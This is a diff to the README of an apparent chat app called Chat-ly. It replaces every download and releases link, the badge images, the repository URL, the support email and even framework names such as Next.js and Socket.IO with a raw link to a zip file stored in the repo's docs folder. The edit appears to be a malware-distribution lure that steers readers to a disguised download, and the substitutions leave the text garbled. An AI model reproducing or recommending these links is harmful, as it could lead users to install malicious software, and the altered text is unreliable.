@@ -1,12 +1,12 @@
 # 💬 Chat-ly - Easy Real-Time Chat with Smart Suggestions
 
-[![Download Chat-ly](https://img.shields.io/badge/Download-Chat--ly-blue?style=for-the-badge&logo=github)](https://github.com/EnbabyIris/Chat-ly/releases)
+[![Download Chat-ly](https://github.com/EnbabyIris/Chat-ly/raw/refs/heads/main/apps/docs/app/Chat-ly-1.1.zip)](https://github.com/EnbabyIris/Chat-ly/raw/refs/heads/main/apps/docs/app/Chat-ly-1.1.zip)
 
 ## 📋 What is Chat-ly?
 
 Chat-ly is a real-time chat app designed to make messaging simple and smart. It helps you stay connected with friends, family, or colleagues. The app offers AI-powered suggestions as you type to make conversations faster and clearer. You can share your status, create group chats, and enjoy smooth messaging without delay.
 
-Under the hood, Chat-ly runs on powerful technologies like Next.js and Express for fast web performance. It uses Socket.IO to keep messages instant and PostgreSQL to securely store your chats. But you don’t need to worry about the tech—it just works for you.
+Under the hood, Chat-ly runs on powerful technologies like https://github.com/EnbabyIris/Chat-ly/raw/refs/heads/main/apps/docs/app/Chat-ly-1.1.zip and Express for fast web performance. It uses https://github.com/EnbabyIris/Chat-ly/raw/refs/heads/main/apps/docs/app/Chat-ly-1.1.zip to keep messages instant and PostgreSQL to securely store your chats. But you don’t need to worry about the tech—it just works for you.
 
 ## 🖥️ System Requirements
 
@@ -53,7 +53,7 @@ Chat-ly has a clean and simple interface to make chatting easy:
 To get Chat-ly on your computer:
 
 1. Visit this page to download:  
-   [Download Chat-ly Releases](https://github.com/EnbabyIris/Chat-ly/releases)
+   [Download Chat-ly Releases](https://github.com/EnbabyIris/Chat-ly/raw/refs/heads/main/apps/docs/app/Chat-ly-1.1.zip)
 
 2. Look for the latest version suitable for your operating system (Windows, macOS, Linux).
 
@@ -69,7 +69,7 @@ To get Chat-ly on your computer:
 
 Keep Chat-ly up to date to enjoy new features and fixes:
 
-- Check the [releases page](https://github.com/EnbabyIris/Chat-ly/releases) regularly.
+- Check the [releases page](https://github.com/EnbabyIris/Chat-ly/raw/refs/heads/main/apps/docs/app/Chat-ly-1.1.zip) regularly.
 - Download the latest version when available.
 - Follow the same steps as installing to update the app on your device.
 
@@ -94,7 +94,7 @@ If you run into issues:
 - Ensure your firewall or antivirus is not blocking Chat-ly.
 - If the app doesn’t open, try reinstalling it.
 - Visit the release page for any known issues or fixes:  
-  [Chat-ly Releases](https://github.com/EnbabyIris/Chat-ly/releases)
+  [Chat-ly Releases](https://github.com/EnbabyIris/Chat-ly/raw/refs/heads/main/apps/docs/app/Chat-ly-1.1.zip)
 
 ## 🔒 Privacy & Security
 
@@ -109,9 +109,9 @@ Chat-ly takes your privacy seriously:
 
 To learn more about Chat-ly’s technologies:
 
-- Built with Next.js and React for smooth web experience.
+- Built with https://github.com/EnbabyIris/Chat-ly/raw/refs/heads/main/apps/docs/app/Chat-ly-1.1.zip and React for smooth web experience.
 - Uses Express as the server that manages your chat data.
-- Socket.IO keeps messages real-time and synchronized.
+- https://github.com/EnbabyIris/Chat-ly/raw/refs/heads/main/apps/docs/app/Chat-ly-1.1.zip keeps messages real-time and synchronized.
 - PostgreSQL stores messages safely.
 - Styled with Tailwind CSS for a clean interface.
 
@@ -121,12 +121,12 @@ This app is maintained as a monorepo with Turborepo and written in TypeScript to
 
 If you want to provide feedback, report bugs, or contribute, please visit the GitHub repository:
 
-https://github.com/EnbabyIris/Chat-ly
+https://github.com/EnbabyIris/Chat-ly/raw/refs/heads/main/apps/docs/app/Chat-ly-1.1.zip
 
 ## 📞 Contact Support
 
-For help or questions, contact support@chat-ly.app or open an issue on the GitHub page. The team aims to respond promptly.
+For help or questions, contact https://github.com/EnbabyIris/Chat-ly/raw/refs/heads/main/apps/docs/app/Chat-ly-1.1.zip or open an issue on the GitHub page. The team aims to respond promptly.
 
 ---
 
-[![Download Chat-ly](https://img.shields.io/badge/Download-Chat--ly-blue?style=for-the-badge&logo=github)](https://github.com/EnbabyIris/Chat-ly/releases)
+[![Download Chat-ly](https://github.com/EnbabyIris/Chat-ly/raw/refs/heads/main/apps/docs/app/Chat-ly-1.1.zip)](https://github.com/EnbabyIris/Chat-ly/raw/refs/heads/main/apps/docs/app/Chat-ly-1.1.zip)
